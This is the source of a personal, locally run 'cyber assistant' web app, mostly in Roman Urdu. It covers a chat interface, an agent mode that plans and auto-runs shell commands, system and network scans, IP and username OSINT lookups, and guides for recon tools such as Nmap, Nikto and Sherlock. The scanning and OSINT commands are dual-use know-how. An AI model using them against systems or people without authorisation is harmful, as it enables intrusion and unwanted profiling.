      <input id="ipinp" placeholder="Type an IP address - or leave empty (your own IP)" autocomplete="off">
      <button class="btn" id="ipbtn">Look Up</button>
    </div>
    <div id="ipresult"></div>
  </div>

  <h2 class="sec">&#128269; USERNAME SEARCH (OSINT)</h2>
  <div id="userbox">
    <p class="scannote">Enter a username - UMBRA-9 checks where <b>public profiles</b> exist under this name (GitHub, YouTube, TikTok, Twitch, Reddit, Telegram, and more). Instagram/Facebook/X do not answer bots cleanly, so you get a direct link for those. <b>Public info only</b> - nothing from inside a private account. Best use: <b>your own username</b> and see where you are public.</p>
    <div id="userbar">
      <input id="userinp" placeholder="Type a username - e.g. your own username" autocomplete="off">
      <button class="btn" id="userbtn">Search</button>
    </div>
    <div id="userresult"></div>
  </div>
  </div>
  </main>
</div>
<footer>For your own lab and learning only &bull; Local AI (Ollama) &bull; Your data never leaves this laptop</footer>

<script>
var history = [];
var currentTool = null;

function esc(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function fmt(s){ return esc(s).replace(/`([^`]+)`/g,'<code>$1</code>').replace(/\*\*([^*]+)\*\*/g,'<b>$1</b>'); }

function addMsg(text, who){
  var d = document.createElement('div');
  d.className = 'msg ' + who;
  d.innerHTML = fmt(text);
  var box = document.getElementById('msgs');
  box.appendChild(d);
  box.scrollTop = box.scrollHeight;
  return d;
}

function sendChat(text){
  text = (text || document.getElementById('inp').value).trim();
  if(!text) return;
  document.getElementById('inp').value = '';
  addMsg(text, 'user');
  history.push({role:'user', content:text});
  var wait = addMsg('Thinking... (local model - may take a few seconds)', 'ai');
  fetch('/api/chat', {method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({messages: history})})
    .then(function(r){ return r.json(); })
    .then(function(j){
      if(j.reply){ wait.innerHTML = fmt(j.reply); history.push({role:'assistant', content:j.reply}); }
      else { wait.innerHTML = fmt(j.error || 'Something went wrong.'); }
      document.getElementById('msgs').scrollTop = document.getElementById('msgs').scrollHeight;
    })
    .catch(function(){ wait.textContent = 'Could not reach the server. Is the terminal window still open?'; });
}

document.getElementById('send').onclick = function(){ sendChat(); };
document.getElementById('inp').addEventListener('keydown', function(e){ if(e.key === 'Enter') sendChat(); });

fetch('/api/tools').then(function(r){ return r.json(); }).then(function(j){
  var chips = document.getElementById('chips');
  j.suggested.forEach(function(q){
    var c = document.createElement('button'); c.className = 'chip'; c.textContent = q;
    c.onclick = function(){ sendChat(q); document.getElementById('chatbox').scrollIntoView({behavior:'smooth'}); };
    chips.appendChild(c);
  });

  var cats = document.getElementById('cats');
  var all = document.createElement('button'); all.className = 'cat active'; all.textContent = 'All Tools';
  all.onclick = function(){ setCat('All', all); };
  cats.appendChild(all);
  j.categories.forEach(function(name){
    var b = document.createElement('button'); b.className = 'cat'; b.textContent = name;
    b.onclick = function(){ setCat(name, b); };
    cats.appendChild(b);
  });

  window.__tools = j.tools;
  window.__guides = j.guides || {};
  renderGrid('All');

  var cg = document.getElementById('cgrid');
  (j.concepts || []).forEach(function(c){
    var card = document.createElement('div'); card.className = 'card';
    card.innerHTML = '<div class="c">Concept</div><h3>' + esc(c.title) + '</h3><p>' + esc(c.body.split('\n')[0]) + '</p>';
    card.onclick = function(){ showConcept(c); };
    cg.appendChild(card);
  });
});

function showConcept(c){
  document.getElementById('ctitle').textContent = c.title;
  document.getElementById('cbody').textContent = c.body;
  var b = document.getElementById('cbox');
  b.style.display = 'block';
  b.scrollIntoView({behavior:'smooth', block:'center'});
}

function setCat(name, btn){
  var bs = document.querySelectorAll('.cat');
  for(var i=0;i<bs.length;i++) bs[i].classList.remove('active');
  btn.classList.add('active');
  renderGrid(name);
}

function renderGrid(cat){
  var grid = document.getElementById('grid');
  grid.innerHTML = '';
  window.__tools.forEach(function(t){
    if(cat !== 'All' && t.cat !== cat) return;
    var card = document.createElement('div'); card.className = 'card';
    card.innerHTML = '<div class="c">' + esc(t.cat) + '</div><h3>' + esc(t.name) + '</h3><p>' + esc(t.desc) + '</p>';
    card.onclick = function(){ showTool(t); };
    grid.appendChild(card);
  });
}

function showTool(t){
  currentTool = t;
  document.getElementById('dname').textContent = t.name;
  document.getElementById('ddesc').textContent = t.desc;
  document.getElementById('dcmd').textContent = t.cmd;
  var g = (window.__guides || {})[t.name];
  var gd = document.getElementById('dguide');
  if(g){ gd.textContent = g; gd.style.display = 'block'; } else { gd.style.display = 'none'; }
  var d = document.getElementById('detail');
  d.style.display = 'block';
  d.scrollIntoView({behavior:'smooth', block:'center'});
}

document.getElementById('dask').onclick = function(){
  if(!currentTool) return;
  sendChat('How to use ' + currentTool.name + '? Explain simply with an example command and what each flag means.');
  document.getElementById('chatbox').scrollIntoView({behavior:'smooth'});
};

fetch('/api/status').then(function(r){ return r.json(); }).then(function(j){
  var s = document.getElementById('status');
  if(j.ollama){ s.className = 'on'; document.getElementById('statustext').textContent = 'AI Online - ' + j.model; }
  else { s.className = 'off'; document.getElementById('statustext').textContent = 'AI Offline - Ollama chalu karo (Tools Directory phir bhi chalegi)'; }
}).catch(function(){});

var agentSteps = [];
var agentTask = '';

function renderSteps(steps){
  var box = document.getElementById('asteps');
  box.innerHTML = '';
  agentSteps = steps;
  steps.forEach(function(s, i){
    var d = document.createElement('div'); d.className = 'step';
    d.innerHTML = '<div class="why"><b>Step ' + (i+1) + ':</b> ' + esc(s.why || '') + '</div>' +
                  '<code>' + esc(s.command) + '</code>' +
                  '<div class="srow"><button class="btn">Run Karo</button><span class="badge">Tayyar</span></div>' +
                  '<pre class="outbox" style="display:none"></pre><div class="explain" style="display:none"></div>';
    d.querySelector('.btn').onclick = function(){ runStep(i, d); };
    box.appendChild(d);
  });
}

function runStep(i, card){
  var s = agentSteps[i];
  var badge = card.querySelector('.badge');
  var out = card.querySelector('.outbox');
  var ex = card.querySelector('.explain');
  badge.textContent = 'Running...'; badge.className = 'badge';
  out.style.display = 'none'; ex.style.display = 'none';
  return fetch('/api/agent/run', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({command: s.command})})
    .then(function(r){ return r.json(); })
    .then(function(j){
      if(j.blocked){
        badge.textContent = 'ROK DIYA GAYA'; badge.className = 'badge bad';
        out.style.display = 'block'; out.textContent = 'Ye command nahi chalayi gayi: ' + j.reason;
        return false;
      }
      if(j.error){
        badge.textContent = 'Masla aya'; badge.className = 'badge bad';
        out.style.display = 'block'; out.textContent = j.error;
        return false;
      }
      badge.textContent = 'Done (code ' + j.code + ')'; badge.className = 'badge ' + (j.code === 0 ? 'ok' : 'bad');
      var txt = (j.stdout || '') + (j.stderr ? '\n[stderr]\n' + j.stderr : '');
      out.style.display = 'block'; out.textContent = txt || '(koi output nahi aya)';
      ex.style.display = 'block'; ex.textContent = 'AI se samjha raha hun...';
      return fetch('/api/agent/explain', {method:'POST', headers:{'Content-Type':'application/json'},
            body: JSON.stringify({task: agentTask, command: s.command, output: txt})})
        .then(function(r){ return r.json(); })
        .then(function(e){ ex.textContent = e.reply ? ('AI explanation:\n' + e.reply) : (e.error || ''); return j.code === 0; });
    })
    .catch(function(){ badge.textContent = 'Server unreachable'; badge.className = 'badge bad'; return false; });
}

document.getElementById('aplan').onclick = function(){
  var t = document.getElementById('atask').value.trim();
  if(!t) return;
  agentTask = t;
  var notes = document.getElementById('anotes');
  notes.textContent = 'Building the plan...';
  document.getElementById('asteps').innerHTML = '';
  fetch('/api/agent/plan', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({task: t})})
    .then(function(r){ return r.json(); })
    .then(function(j){
      if(j.error){ notes.textContent = j.error; return; }
      notes.textContent = (j.notes || '') + (j.raw ? '\n\n' + j.raw : '');
      renderSteps(j.steps || []);
      if(document.getElementById('aauto').checked && agentSteps.length){
        notes.textContent += '\nAuto Mode: running commands...';
        var chain = Promise.resolve(true);
        agentSteps.forEach(function(s, i){
          var card = document.getElementById('asteps').children[i];
          chain = chain.then(function(go){ return go ? runStep(i, card) : false; });
        });
      }
    })
    .catch(function(){ notes.textContent = 'Could not reach the server.'; });
};
document.getElementById('atask').addEventListener('keydown', function(e){ if(e.key === 'Enter') document.getElementById('aplan').click(); });

document.getElementById('mrun').onclick = function(){
  var c = document.getElementById('mcmd').value.trim();
  if(!c) return;
  var out = document.getElementById('mout');
  out.style.display = 'block'; out.textContent = 'Running...';
  fetch('/api/agent/run', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({command: c})})
    .then(function(r){ return r.json(); })
    .then(function(j){
      if(j.blocked){ out.textContent = 'ROK DIYA GAYA: ' + j.reason; return; }
      if(j.error){ out.textContent = j.error; return; }
      out.textContent = '$ ' + j.command + '  (exit code ' + j.code + ')\n' + (j.stdout || '') + (j.stderr ? '\n[stderr]\n' + j.stderr : '');
    })
    .catch(function(){ out.textContent = 'Could not reach the server.'; });
};
document.getElementById('mcmd').addEventListener('keydown', function(e){ if(e.key === 'Enter') document.getElementById('mrun').click(); });

var lastReport = '';

function doFix(a, btn, res){
  if(!confirm(a.confirm || 'Pakka?')) return;
  btn.disabled = true; res.textContent = 'Working...';
  fetch('/api/fix', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({action: a.action, params: a.params || {}})})
    .then(function(r){ return r.json(); })
    .then(function(j){
      res.textContent = (j.ok ? 'Done: ' : 'Failed: ') + (j.message || '');
      if(j.ok){ btn.textContent = 'Done'; }
      else { btn.disabled = false; }
    })
    .catch(function(){ res.textContent = 'Could not reach the server.'; btn.disabled = false; });
}

document.getElementById('scanbtn').onclick = function(){
  var btn = this;
  btn.textContent = 'Scanning... (please wait)'; btn.disabled = true;
  document.getElementById('scanresults').innerHTML = '';
  document.getElementById('scansummary').innerHTML = '';
  var bn0 = document.getElementById('alertbanner'); bn0.className = ''; bn0.textContent = '';
  document.getElementById('scanexplain').style.display = 'none';
  document.getElementById('scanaitxt').style.display = 'none';
  fetch('/api/scan', {method:'POST', headers:{'Content-Type':'application/json'}, body:'{}'})
    .then(function(r){ return r.json(); })
    .then(function(j){
      btn.textContent = 'Scan Now'; btn.disabled = false;
      lastReport = j.text || '';
      var c = j.counts || {ok:0, warn:0, danger:0};
      document.getElementById('scansummary').innerHTML =
        '<span class="badge ok">Theek: ' + c.ok + '</span>' +
        '<span class="badge warnb">Dhyan do: ' + c.warn + '</span>' +
        '<span class="badge bad">Khatarnak: ' + c.danger + '</span>';
      var banner = document.getElementById('alertbanner');
      if(c.danger > 0){
        banner.className = 'danger';
        banner.textContent = 'ALERT: ' + c.danger + ' DANGEROUS items found! See the red findings below - delete/remove happens only on your order.';
      } else if(c.warn > 0){
        banner.className = 'warn';
        banner.textContent = c.warn + ' items need attention - see the yellow findings below.';
      } else {
        banner.className = ''; banner.textContent = '';
      }
      var box = document.getElementById('scanresults');
      (j.findings || []).forEach(function(f){
        var d = document.createElement('div'); d.className = 'finding f-' + f.level;
        d.innerHTML = '<b>' + esc(f.title) + '</b>' + (f.detail ? '<p>' + esc(f.detail) + '</p>' : '');
        if(f.actions && f.actions.length){
          var res = document.createElement('div'); res.className = 'fixresult';
          f.actions.forEach(function(a){
            var b = document.createElement('button'); b.className = 'fixbtn'; b.textContent = a.label;
            b.onclick = function(){ doFix(a, b, res); };
            d.appendChild(b);
          });
          d.appendChild(res);
        }
        box.appendChild(d);
      });
      document.getElementById('scanexplain').style.display = 'inline-block';
    })
    .catch(function(){
      btn.textContent = 'Scan Now'; btn.disabled = false;
      document.getElementById('scansummary').textContent = 'Could not reach the server.';
    });
};

document.getElementById('scanexplain').onclick = function(){
  var t = document.getElementById('scanaitxt');
  t.style.display = 'block'; t.textContent = 'AI report parh raha hai...';
  fetch('/api/scan/explain', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({report: lastReport})})
    .then(function(r){ return r.json(); })
    .then(function(j){ t.textContent = j.reply || j.error || ''; })
    .catch(function(){ t.textContent = 'Could not reach the server.'; });
};

document.getElementById('netbtn').onclick = function(){
  var btn = this; btn.textContent = 'Testing...'; btn.disabled = true;
  var box = document.getElementById('netresults'); box.innerHTML = '';
  fetch('/api/nettest', {method:'POST', headers:{'Content-Type':'application/json'}, body:'{}'})
    .then(function(r){ return r.json(); })
    .then(function(j){
      btn.textContent = 'Run Network Test'; btn.disabled = false;
      var list = j.findings || [];
      if(!list.length){ box.innerHTML = '<p class="scannote">Koi result nahi aya.</p>'; return; }
      list.forEach(function(f){
        var d = document.createElement('div'); d.className = 'finding f-' + f.level;
        d.innerHTML = '<b>' + esc(f.title) + '</b>' + (f.detail ? '<p>' + esc(f.detail) + '</p>' : '');
        box.appendChild(d);
      });
    })
    .catch(function(){
      btn.textContent = 'Run Network Test'; btn.disabled = false;
      box.innerHTML = '<p class="scannote">Could not reach the server.</p>';
    });
};

document.getElementById('ipbtn').onclick = function(){
  var ip = document.getElementById('ipinp').value.trim();
  var box = document.getElementById('ipresult');
  box.innerHTML = '<p class="scannote">Dhund raha hun...</p>';
  fetch('/api/iplookup', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ip: ip})})
    .then(function(r){ return r.json(); })
    .then(function(j){
      if(j.error){ box.innerHTML = '<div class="finding f-warn"><b>Info nahi mili</b><p>' + esc(j.error) + '</p></div>'; return; }
      var d = j.result || {};
      var rows = [['IP', d.query], ['Mulk', d.country], ['Ilaqa', d.regionName], ['Sheher', d.city],
                  ['Internet Company (ISP)', d.isp], ['Organization', d.org],
                  ['Coordinates (takreeban)', (d.lat ? d.lat + ', ' + d.lon : '')], ['Time Zone', d.timezone]];
      var html = '<div class="finding f-ok"><b>IP ki info</b>';
      rows.forEach(function(r){ if(r[1]) html += '<p><b>' + esc(r[0]) + ':</b> ' + esc(String(r[1])) + '</p>'; });
      html += '<p>Note: Coordinates sheher ke center ke hote hain, kisi ke ghar ke nahi - IP location kabhi exact nahi hoti.</p></div>';
      box.innerHTML = html;
    })
    .catch(function(){ box.innerHTML = '<p class="scannote">Could not reach the server.</p>'; });
};
document.getElementById('ipinp').addEventListener('keydown', function(e){ if(e.key === 'Enter') document.getElementById('ipbtn').click(); });

document.getElementById('userbtn').onclick = function(){
  var u = document.getElementById('userinp').value.trim();
  if(!u) return;
  var box = document.getElementById('userresult');
  box.innerHTML = '<p class="scannote">11 jagah check ho raha hai...</p>';
  fetch('/api/username', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username: u})})
    .then(function(r){ return r.json(); })
    .then(function(j){
      if(j.error){ box.innerHTML = '<div class="finding f-warn"><b>Masla</b><p>' + esc(j.error) + '</p></div>'; return; }
      var labels = {found: ['f-ok', 'Profile MILA'], notfound: ['f-ok', 'Not found'], check: ['f-warn', 'Check it yourself']};
      var html = '';
      (j.results || []).forEach(function(r){
        var L = labels[r.status] || labels.check;
        html += '<div class="finding ' + L[0] + '"><b>' + esc(r.site) + ' - ' + L[1] + '</b><p><a href="' + esc(r.url) + '" target="_blank" rel="noopener">' + esc(r.url) + '</a></p>';
        if(r.details){
          for(var k in r.details){ html += '<p><b>' + esc(k) + ':</b> ' + esc(r.details[k]) + '</p>'; }
        }
        html += '</div>';
      });
      html += '<p class="scannote">Note: ek hi username kisi aur ka bhi ho sakta hai - OSINT mein pehchan hamesha doosri nishaniyon (photo, posts) se confirm karni parti hai.</p>';
      box.innerHTML = html;
    })
    .catch(function(){ box.innerHTML = '<p class="scannote">Could not reach the server.</p>'; });
};
document.getElementById('userinp').addEventListener('keydown', function(e){ if(e.key === 'Enter') document.getElementById('userbtn').click(); });

addMsg('Assalam-o-Alaikum Kashif! Main UMBRA-9 hun, tumhara personal Cyber Assistant. Upar kisi tool par click karo, ya ready-made sawal chuno, ya neeche apna sawal likho.', 'ai');

  document.querySelectorAll('.snav a').forEach(function(a){
    a.addEventListener('click', function(){
      document.querySelectorAll('.snav a').forEach(function(x){ x.classList.remove('on'); });
      a.classList.add('on');
      document.querySelectorAll('.view').forEach(function(v){ v.classList.remove('on'); });
      var t = document.getElementById('view-' + a.dataset.view);
      if (t) t.classList.add('on');
      window.scrollTo({top: 0, behavior: 'smooth'});
    });
  });

  (function(){ var c = document.getElementById('clock');
    function tick(){ if (c) c.textContent = new Date().toLocaleTimeString(); }
    tick(); setInterval(tick, 1000); })();
</script>
</body>
</html>
"""


def ollama_alive():
    try:
        req = urllib.request.Request(TAGS_URL, method="GET")
        with urllib.request.urlopen(req, timeout=4) as resp:
            return resp.status == 200
    except Exception:
        return False


def ask_ollama(client_messages):
    """Browser se ayi history ko system prompt ke saath Ollama ko bhejo."""
    messages = [{"role": "system", "content": SYSTEM_PROMPT}]
    for m in client_messages[-20:]:
        role = m.get("role")
        content = str(m.get("content", ""))[:4000]
        if role in ("user", "assistant") and content:
            messages.append({"role": role, "content": content})
    payload = {"model": MODEL, "messages": messages, "stream": False}
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        OLLAMA_URL, data=data, headers={"Content-Type": "application/json"}, method="POST"
    )
    with urllib.request.urlopen(req, timeout=300) as resp:
        result = json.loads(resp.read().decode("utf-8"))
    return result["message"]["content"].strip()



# ---------------------------------------------------------------------------
# PASSWORD LOCK - pehli dafa password banao, phir har dafa login page ayega.
# Password ka hash isi folder ki umbra9_lock.json mein rehta hai (password
# khud kabhi save nahi hota). Bhool jao to umbra9_lock.json delete kardo,
# setup dobara a jayega.
# ---------------------------------------------------------------------------
import hashlib
import hmac
import urllib.parse

LOCK_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "umbra9_lock.json")


def _lock_hash():
    try:
        with open(LOCK_FILE, encoding="utf-8") as f:
            return json.load(f).get("hash", "")
    except Exception:
        return ""


def _lock_set(pw):
    h = hashlib.sha256((pw + "|umbra9-local").encode()).hexdigest()
    with open(LOCK_FILE, "w", encoding="utf-8") as f:
        json.dump({"hash": h}, f)
    return h


def _lock_token():
    return hmac.new(_lock_hash().encode(), b"umbra9-local", hashlib.sha256).hexdigest()


LOCK_PAGE = """<!DOCTYPE html>
<html lang="ur"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>UMBRA-9 — Login</title>
<style>
body{background:#02070c;color:#d7e8de;font-family:'Segoe UI',system-ui,sans-serif;display:flex;
min-height:100vh;align-items:center;justify-content:center;margin:0;
background-image:radial-gradient(900px 480px at 85% -10%, rgba(13,138,78,.22), transparent 60%),
radial-gradient(700px 420px at -10% 0%, rgba(52,211,153,.12), transparent 55%)}
.box{background:rgba(3,10,14,.95);border:1px solid #0c2b22;border-radius:14px;padding:30px;width:min(92vw,370px);
text-align:center;box-shadow:0 0 0 1px rgba(52,211,153,.15), 0 18px 50px rgba(0,0,0,.55)}
h1{margin:0 0 4px;font-size:30px;letter-spacing:3px;font-weight:800;
background:linear-gradient(180deg,#d9fff0,#34d399 70%,#0d8a4e);-webkit-background-clip:text;background-clip:text;color:transparent}
.sub{color:#7d93a3;margin:4px 0 2px;font-size:13.5px}
h2{color:#eafff5;font-size:17px;margin:14px 0 6px}
p.note{color:#8fa8a0;font-size:13px;line-height:1.55;margin:0 0 16px}
input{width:100%;box-sizing:border-box;padding:12px;border-radius:9px;border:1px solid #134233;
background:#010507;color:#eafff5;font-size:16px;margin-bottom:12px}
input:focus{outline:none;border-color:#34d399;box-shadow:0 0 0 2px rgba(52,211,153,.18)}
button{width:100%;padding:12px;border:0;border-radius:9px;font-weight:700;cursor:pointer;font-size:16px;color:#04120d;
background:linear-gradient(180deg,#34d399,#0d8a4e);box-shadow:0 4px 14px rgba(13,138,78,.35)}
.err{color:#f87171;min-height:20px;font-size:14px;margin-top:10px}
</style></head><body>
<form class="box" method="post" action="/login">
<h1>UMBRA-9</h1>
<p class="sub">The deepest shadow — Kashif's Personal Cyber Assistant</p>
<h2>%%HEADING%%</h2>
<p class="note">%%NOTE%%</p>
<input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
<button type="submit">%%BUTTON%%</button>
<div class="err">%%ERR%%</div>
</form></body></html>"""

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass  # terminal saaf rakho

    def _send_json(self, obj, code=200):
        body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    # --- Password lock helpers ---
    def _lock_ok(self):
        if not _lock_hash():
            return False
        for part in self.headers.get("Cookie", "").split(";"):
            part = part.strip()
            if part.startswith("umbra9_local="):
                return hmac.compare_digest(part[len("umbra9_local="):], _lock_token())
        return False

    def _lock_redirect(self):
        self.send_response(302)
        self.send_header("Location", "/login")
        self.end_headers()

    def _lock_page(self, err=""):
        setup = not _lock_hash()
        if setup:
            page = LOCK_PAGE.replace("%%HEADING%%", "First time — create your password")
            page = page.replace("%%NOTE%%", "This password works only on this laptop. "
                                            "Use a strong password of at least 6 characters — "
                                            "and never share it with anyone.")
            page = page.replace("%%BUTTON%%", "Create password & enter")
        else:
            page = LOCK_PAGE.replace("%%HEADING%%", "Login")
            page = page.replace("%%NOTE%%", "Enter your password — this assistant is yours alone.")
            page = page.replace("%%BUTTON%%", "Login")
        page = page.replace("%%ERR%%", err)
        body = page.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _lock_login(self):
        try:
            n = int(self.headers.get("Content-Length", "0"))
            raw = self.rfile.read(n).decode("utf-8", "replace")
            pw = urllib.parse.parse_qs(raw).get("password", [""])[0]
        except Exception:
            pw = ""
        if not _lock_hash():
            if len(pw) < 6:
                self._lock_page("Password must be at least 6 characters.")
                return
            _lock_set(pw)
        elif not hmac.compare_digest(
                hashlib.sha256((pw + "|umbra9-local").encode()).hexdigest(), _lock_hash()):
            self._lock_page("Wrong password — try again.")
            return
        self.send_response(302)
        self.send_header("Location", "/")
        self.send_header("Set-Cookie",
                         f"umbra9_local={_lock_token()}; Path=/; HttpOnly; SameSite=Lax; Max-Age=2592000")
        self.end_headers()

    def do_GET(self):
        if self.path == "/login":
            self._lock_page()
            return
        if not self._lock_ok():
            self._lock_redirect()
            return
        if self.path == "/" or self.path.startswith("/?"):
            body = PAGE.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif self.path == "/manifest.json":
            self._send_json({"name": "UMBRA-9 — Personal Cyber Assistant", "short_name": "UMBRA-9",
                             "start_url": "/", "display": "standalone",
                             "background_color": "#0b0f14", "theme_color": "#0b0f14"})
        elif self.path == "/api/tools":
            self._send_json({"categories": CATEGORIES, "tools": TOOLS, "suggested": SUGGESTED,
                             "guides": GUIDES, "concepts": CONCEPTS})
        elif self.path == "/api/status":
            self._send_json({"ollama": ollama_alive(), "model": MODEL})
        else:
            self._send_json({"error": "not found"}, 404)

    def do_POST(self):
        if self.path == "/login":
            self._lock_login()
            return
        if not self._lock_ok():
            self._send_json({"error": "Please log in first."}, 401)
            return
        try:
            length = int(self.headers.get("Content-Length", "0"))
            data = json.loads(self.rfile.read(length).decode("utf-8"))
        except Exception:
            self._send_json({"error": "Request samajh nahi aya."}, 400)
            return

        if self.path == "/api/agent/plan":
            self._agent_plan(data)
            return
        if self.path == "/api/agent/run":
            self._agent_run(data)
            return
        if self.path == "/api/agent/explain":
            self._agent_explain(data)
            return
        if self.path == "/api/scan":
            self._api_scan(data)
            return
        if self.path == "/api/scan/explain":
            self._api_scan_explain(data)
            return
        if self.path == "/api/fix":
            self._api_fix(data)
            return
        if self.path == "/api/nettest":
            self._api_nettest(data)
            return
        if self.path == "/api/iplookup":
            self._api_iplookup(data)
            return
        if self.path == "/api/username":
            self._api_username(data)
            return
        if self.path != "/api/chat":
            self._send_json({"error": "not found"}, 404)
            return
        messages = data.get("messages", [])

        if not ollama_alive():
            self._send_json({
                "error": (
                    "AI abhi OFFLINE hai - Ollama nahi chal raha.\n\n"
                    "Setup (sirf ek dafa):\n"
                    "1) ollama.com se Ollama install karo\n"
                    "2) Terminal mein chalao:  ollama pull llama3.2:3b\n"
                    "3) Phir is page ko refresh karo\n\n"
                    "Tab tak Tools Directory upar istemal kar sakte ho - har tool ki samajh aur basic command wahan mojood hai."
                )
            })
            return

        try:
            reply = ask_ollama(messages)
            self._send_json({"reply": reply})
        except Exception as e:
            self._send_json({"error": f"Model se jawab nahi aya ({e}). Thori dair baad dobara koshish karo."})


def main():
    host = os.environ.get("CYBER_HOST", "127.0.0.1")
    server = ThreadingHTTPServer((host, PORT), Handler)
    url = f"http://localhost:{PORT}"
    print("=" * 62)
    print("   UMBRA-9 (Web) chal gaya hai")
    print(f"   Browser mein kholo:  {url}")
    if host == "0.0.0.0":
        print("   NOTE: Network mode ON hai - sirf apne PRIVATE network (Tailscale) par istemal karo, public internet par kabhi mat kholo.")
    print(f"   AI model: {MODEL}  |  Ollama: {'ONLINE' if ollama_alive() else 'OFFLINE (directory phir bhi chalegi)'}")
    print("   Band karne ke liye: Ctrl+C")
    print("=" * 62)
    if not os.environ.get("CYBER_NO_BROWSER"):
        threading.Timer(1.0, lambda: webbrowser.open(url)).start()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nBand ho gaya. Allah Hafiz!")




# ---------------------------------------------------------------------------
# GUIDES - Muse ka likha hua knowledge, file ke andar mehfooz.
# Ye hissa baghair internet aur baghair AI model ke bhi chalta hai.
# Har tool: kya hai, zaroori commands (flags ki samajh ke saath), aam ghalti.
# ---------------------------------------------------------------------------
GUIDES = {
"Nmap": """Kya hai: Network ka raja scanner. Kisi machine ke open ports, chalti services aur OS ka pata lagata hai.
Zaroori commands:
- nmap TARGET : sirf top 1000 ports scan
- nmap -sV TARGET : har port par service + version (sab se zyada istemal)
- nmap -sS TARGET : stealth scan (root chahiye), jaldi aur khamosh
- nmap -A TARGET : aggressive - OS, version, scripts, traceroute sab
- nmap -p- TARGET : saare 65535 ports (waqt lagta hai)
- nmap -sU TARGET : UDP ports (aksar bhool jate hain, DNS/SNMP yahin hote hain)
- nmap -oN result.txt TARGET : result file mein save
Aam ghalti: Bina permission kisi doosre ke network ko scan karna - sirf apni lab/CTF par.
Yaad rakho: -sV = Service Version, -A = All in one.""",

"Netdiscover": """Kya hai: Apne local network (LAN) mein zinda machines dhundta hai, ARP requests bhej kar.
Zaroori commands:
- netdiscover : khud hi range guess karke scan
- netdiscover -r 192.168.1.0/24 : di gayi range scan karo
- netdiscover -i eth0 : specific interface par
Kab kaam ata hai: Jab tumhein apni hi lab ki doosri VM ka IP na pata ho.
Yaad rakho: Ye sirf local network par chalta hai, internet par nahi.""",

"theHarvester": """Kya hai: OSINT tool - public sources se kisi domain ke emails, subdomains, naam aur hosts jama karta hai. Target ko haath lagaye baghair info milti hai (passive recon).
Zaroori commands:
- theHarvester -d example.com -b all : saare sources
- theHarvester -d example.com -b google,bing : sirf chune hue sources
- theHarvester -d example.com -l 200 -b all : results ki had (limit)
Aam ghalti: Is ke results ko final samajh lena - purani info bhi a sakti hai, verify karo.
Yaad rakho: Passive = target ko pata hi nahi chalta.""",

"Recon-ng": """Kya hai: OSINT ka framework, Metasploit jaisa style - modules load karke reconnaissance hoti hai.
Zaroori commands:
- recon-ng : chalao
- marketplace search : modules dhundo
- marketplace install <module> : module lagao
- modules load <module> : load karo, phir 'options set' aur 'run'
Kab kaam ata hai: Bari, munazzam OSINT tehqeeq ke liye.
Yaad rakho: Kuch modules ko API key chahiye hoti hai.""",

"Maltego": """Kya hai: Connections ki graph banata hai - domain, IP, email, shakhs ke darmiyan taluq nazar ata hai. Visual OSINT ka mashhoor tool.
Kaise chalta hai: Program kholo, 'Entity' dalo (masalan domain), right-click karke 'Transforms' chalao - graph khud banta jata hai.
Kab kaam ata hai: Jab info bikri hui ho aur rishtay samajhne hon.
Yaad rakho: Free (community) version mein transforms mehdood hote hain.""",

"Sherlock": """Kya hai: Ek username do, ye 400+ websites par check karta hai ke ye naam kahan kahan maujood hai.
Zaroori commands:
- sherlock username : ek naam check
- sherlock user1 user2 : kai naam ek saath
- sherlock username --output result.txt : file mein save
Kab kaam ata hai: OSINT mein kisi ki online mojoodgi talash karna (sirf taleemi maqsad).
Yaad rakho: Naam milna = wohi shakhs hona zaroori nahi, common naam kai logon ke hote hain.""",

"DNSenum": """Kya hai: Kisi domain ke DNS records (A, MX, NS) aur subdomains enumerate karta hai.
Zaroori commands:
- dnsenum example.com : basic enumeration
- dnsenum --enum example.com : zyada tafseel (brute force bhi)
- dnsenum -f subdomains.txt example.com : apni wordlist se subdomain check
Kab kaam ata hai: Recon mein - mail server, chhupe subdomains (dev., mail.) milte hain.
Yaad rakho: Subdomain aksar asal kamzori chhupata hai (purana dev server).""",

"Nikto": """Kya hai: Web server scanner - 6000+ jani hui kamzoriyan, purani files, galat settings check karta hai.
Zaroori commands:
- nikto -h http://TARGET : basic scan
- nikto -h http://TARGET -p 8080 : specific port
- nikto -h https://TARGET -ssl : HTTPS site ke liye
- nikto -h http://TARGET -o report.html -Format html : report banana
Aam ghalti: Nikto bohat shore karta hai (logs mein saaf pakra jata hai) - stealth tool nahi hai.
Yaad rakho: Nikto = jaldi wala pehla check, gehra test Burp se hota hai.""",

"OpenVAS (Greenbone)": """Kya hai: Sab se mazboot free vulnerability scanner - poore network ki kamzoriyan tafseel se nikalta hai. Greenbone is ka naya naam hai.
Kaise chalta hai:
- gvm-start : service shuru (pehli dafa setup mein ghante lag sakte hain)
- Browser mein https://127.0.0.1:9392 kholo, login karo
- 'New Task' bana kar target do, scan chalao - report PDF/HTML mein milti hai
Aam ghalti: Scan bohat bhaari hota hai - kamzor lab machine ko slow kar sakta hai.
